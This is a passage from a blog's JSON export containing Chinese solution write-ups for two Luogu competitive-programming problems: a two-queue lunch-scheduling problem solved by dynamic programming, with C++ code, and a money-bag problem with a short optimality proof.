&amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d%d\", &amp;man[i].a, &amp;man[i].b); &#125; sort(man, man + n); sum[0] = man[0].a; FWD(i, 1, n) &#123; sum[i] = sum[i - 1] + man[i].a; &#125; memset(dp, 10, sizeof(dp)); dp[0] = man[0].b + man[0].a; dp[man[0].a] = man[0].b + man[0].a; FWD(i, 1, n) &#123; BWD(j, sum[i], 0) &#123; int tmp1 = INF, tmp2 = INF; if (j &gt;= man[i].a) &#123; tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队 &#125; if (sum[i] - j &gt;= man[i].a) &#123; tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队 &#125; // 如果j只能允许man[i].a放在一队，则i就放一队 if (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123; dp[j] = tmp1; &#125;else if (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = tmp2; &#125;else if (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = MIN(tmp2, tmp1); &#125; &#125; &#125; int ans = INF; FWD(i, 0, sum[n - 1] + 1) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125; printf(\"%d\\n\", ans);&#125; 注意，在枚举$dp[i][j]$ 的j 时，要注意该j 是否允许man[i].a 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归 截图来源","raw":"---\ntitle: 洛谷2577 午餐\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-20 08:20:06\ntags: \n- 动态规划\n- ACM\ndescription: 题解\ncategories:\n- 算法\n---\n\n## 题目\n\n#### 题目描述\n\n上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。\n\nTHU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。\n\n现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。\n\n假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。\n\n现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。\n\n#### 输入输出格式\n\n输入格式：\n\n第一行一个整数N，代表总共有N个人。\n\n以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。\n\n输出格式：\n\n一个整数T，代表所有人吃完饭的最早时刻。\n\n#### 输入输出样例\n\n输入样例#1：\n\n```\n5\n2 2\n7 7\n1 3\n6 4\n8 5\n\n```\n\n输出样例#1：\n\n```\n17\n```\n\n## 题解\n\n#### 吃饭时间越长越早排队\n\n- 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，`i`、`j` ——即原先是`i` 排在`j` 前面，并且两人各自的吃饭时间$b[j]<b[i]$，现在交换过来\n- 首先，交换前从队头到到`j` 总的打饭时间或者是交换后从队头到`i` 的总的打饭时间都是$T$\n- 然后以前$T$时间后，`j` 开始吃饭，现在是$T$时间后，`i` 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是`j` 的吃饭时间），那么现在就是$T+b[i]>T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ \n\n#### 如何记录状态以及状态转移方程\n\n- $dp[i][j][k]$ ：表示当排到第`i` 个人时，第一队的排队耗时是`j` ，第二队的排队耗时是`k` \n\n- 先定义符号，$man[i].a$ 表示第`i` 人的打饭时间，$man[i].b$ 是第`i` 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$\n\n- 因为，对于确定的`i` ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ \n\n- ```cpp\n  int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);\n  int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);\n  dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);\n  ```\n\n- 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX\n\n- 因为无需枚举`k` ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <vector>\n#define FWD(x, b, e) for (int x = b; x < e; x++)\n#define BWD(x, b, e) for (int x = b; x >= e; x--)\n#define INF 0x3f3f3f3f\nusing namespace std;\n\ninline int MAX(int x, int y) { return x < y ? y : x; }\n\ninline int MIN(int x, int y) { return x < y ? x : y; }\n\nstruct Node {\n    int a, b;// a is pick time, b is eat time\n    bool operator<(const Node &y) const { return this->b > y.b; }\n};\nNode man[300];\nint dp[80010];\nint sum[300];\n\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    for (int i = 0; i < n; i++) {\n        scanf(\"%d%d\", &man[i].a, &man[i].b);\n    }\n    sort(man, man + n);\n\n    sum[0] = man[0].a;\n    FWD(i, 1, n) { sum[i] = sum[i - 1] + man[i].a; }\n    memset(dp, 10, sizeof(dp));\n    dp[0] = man[0].b + man[0].a;\n    dp[man[0].a] = man[0].b + man[0].a;\n    FWD(i, 1, n) {\n        BWD(j, sum[i], 0) {\n            int tmp1 = INF, tmp2 = INF;\n            if (j >= man[i].a) {\n                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队\n            }\n            if (sum[i] - j >= man[i].a) {\n                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队\n            }\n            // 如果j只能允许man[i].a放在一队，则i就放一队\n            if (j >= man[i].a && sum[i] - j < man[i].a) {\n                dp[j] = tmp1;\n            }else if (j < man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = tmp2;\n            }else if (j >= man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = MIN(tmp2, tmp1);\n            }\n        }\n    }\n    int ans = INF;\n    FWD(i, 0, sum[n - 1] + 1) { ans = ans < dp[i] ? ans : dp[i]; }\n    printf(\"%d\\n\", ans);\n}\n```\n\n- 注意，在枚举$dp[i][j]$ 的`j` 时，要注意该`j ` 是否允许`man[i].a` 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN\n\n- 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j<man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j<man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。\n\n- 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归\n\n  {% asset_img 1.png %}\n\n- [截图来源 ](https://www.luogu.org/problemnew/solution/P2577)\n\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述\"></a>题目描述</h4><p>上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。</p>\n<p>THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。</p>\n<p>现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。</p>\n<p>假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。</p>\n<p>现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><p>输入格式：</p>\n<p>第一行一个整数N，代表总共有N个人。</p>\n<p>以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。</p>\n<p>输出格式：</p>\n<p>一个整数T，代表所有人吃完饭的最早时刻。</p>\n<h4 id=\"输入输出样例\"><a href=\"#输入输出样例\" class=\"headerlink\" title=\"输入输出样例\"></a>输入输出样例</h4><p>输入样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5</span><br><span class=\"line\">2 2</span><br><span class=\"line\">7 7</span><br><span class=\"line\">1 3</span><br><span class=\"line\">6 4</span><br><span class=\"line\">8 5</span><br></pre></td></tr></table></figure>\n<p>输出样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">17</span><br></pre></td></tr></table></figure>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><h4 id=\"吃饭时间越长越早排队\"><a href=\"#吃饭时间越长越早排队\" class=\"headerlink\" title=\"吃饭时间越长越早排队\"></a>吃饭时间越长越早排队</h4><ul>\n<li>假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，<code>i</code>、<code>j</code> ——即原先是<code>i</code> 排在<code>j</code> 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来</li>\n<li>首先，交换前从队头到到<code>j</code> 总的打饭时间或者是交换后从队头到<code>i</code> 的总的打饭时间都是$T$</li>\n<li>然后以前$T$时间后，<code>j</code> 开始吃饭，现在是$T$时间后，<code>i</code> 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是<code>j</code> 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ </li>\n</ul>\n<h4 id=\"如何记录状态以及状态转移方程\"><a href=\"#如何记录状态以及状态转移方程\" class=\"headerlink\" title=\"如何记录状态以及状态转移方程\"></a>如何记录状态以及状态转移方程</h4><ul>\n<li><p>$dp[i][j][k]$ ：表示当排到第<code>i</code> 个人时，第一队的排队耗时是<code>j</code> ，第二队的排队耗时是<code>k</code> </p>\n</li>\n<li><p>先定义符号，$man[i].a$ 表示第<code>i</code> 人的打饭时间，$man[i].b$ 是第<code>i</code> 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$</p>\n</li>\n<li><p>因为，对于确定的<code>i</code> ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ </p>\n</li>\n<li><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> x = MAX(dp[i<span class=\"number\">-1</span>][j-man[i].a][k], j+man[i].b);</span><br><span class=\"line\"><span class=\"keyword\">int</span> y = MAX(dp[i<span class=\"number\">-1</span>][j][k-man[i].a], k+man[i].b);</span><br><span class=\"line\">dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX</p>\n</li>\n<li><p>因为无需枚举<code>k</code> ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组</p>\n</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FWD(x, b, e) for (int x = b; x &lt; e; x++)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BWD(x, b, e) for (int x = b; x &gt;= e; x--)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MAX</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? y : x; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MIN</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? x : y; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a, b;<span class=\"comment\">// a is pick time, b is eat time</span></span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Node &amp;y) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>-&gt;b &gt; y.b; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node man[<span class=\"number\">300</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">80010</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> sum[<span class=\"number\">300</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;man[i].a, &amp;man[i].b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(man, man + n);</span><br><span class=\"line\"></span><br><span class=\"line\">    sum[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123; sum[i] = sum[i - <span class=\"number\">1</span>] + man[i].a; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">10</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    dp[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    dp[man[<span class=\"number\">0</span>].a] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123;</span><br><span class=\"line\">        BWD(j, sum[i], <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> tmp1 = INF, tmp2 = INF;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);<span class=\"comment\">// 第一个人放在1队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);<span class=\"comment\">// 第i个人放在二队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果j只能允许man[i].a放在一队，则i就放一队</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp1;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp2;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = MIN(tmp2, tmp1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = INF;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">0</span>, sum[n - <span class=\"number\">1</span>] + <span class=\"number\">1</span>) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>注意，在枚举$dp[i][j]$ 的<code>j</code> 时，要注意该<code>j</code> 是否允许<code>man[i].a</code> 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN</p>\n</li>\n<li><p>注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。</p>\n</li>\n<li><p>此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归</p>\n<img src=\"/2018/05/20/洛谷2577-午餐/1.png\">\n</li>\n<li><p><a href=\"https://www.luogu.org/problemnew/solution/P2577\" target=\"_blank\" rel=\"noopener\">截图来源 </a></p>\n</li>\n</ul>\n","slug":"洛谷2577-午餐","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"动态规划","slug":"动态规划","permalink":"https://h-zex.github.io/tags/动态规划/"}]},{"title":"洛谷2320 鬼谷子的钱袋 形式化证明","date":"2018-05-16T17:33:21.000Z","path":"2018/05/17/洛谷2320-鬼谷子的钱袋-形式化证明/","text":"题目描述鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。 有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。 但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。 鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？ 输入输出格式 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开 输入输出示例12345输入3输出21 2 解法 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解 证明 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$ 所以我们的解法已经达到了最优","raw":"---\ntitle: 洛谷2320 鬼谷子的钱袋 形式化证明\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-17 01:33:21\ntags:\n- ACM\n- 数学\n- 递归\ndescription: 题解\ncategories:\n- 算法\n\n---\n\n## 题目\n\n#### 描述\n\n鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。\n\n有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。\n\n但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。\n\n鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？\n\n\n#### 输入输出格式\n\n- 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。\n\n- 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开\n\n\n#### 输入输出示例\n\n```\n输入\n3\n输出\n2\n1 2\n```\n\n## 解法\n\n- 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解\n\n## 证明\n\n- 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子\n- 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ \n- 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$\n- 所以我们的解法已经达到了最优\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h4><p>鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。</p>\n<p>有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。</p>\n<p>但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。</p>\n<p>鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><ul>\n<li><p>输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。</p>\n</li>\n<li><p>输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开</p>\n</li>\n</ul>\n<h4 id=\"输入输出示例\"><a href=\"#输入输出示例\" class=\"headerlink\" title=\"输入输出示例\"></a>输入输出示例</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入</span><br><span class=\"line\">3</span><br><span class=\"line\">输出</span><br><span class=\"line\">2</span><br><span class=\"line\">1 2</span><br></pre></td></tr></table></figure>\n<h2 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h2><ul>\n<li>对于m个待装袋的金币，取$\\lceil 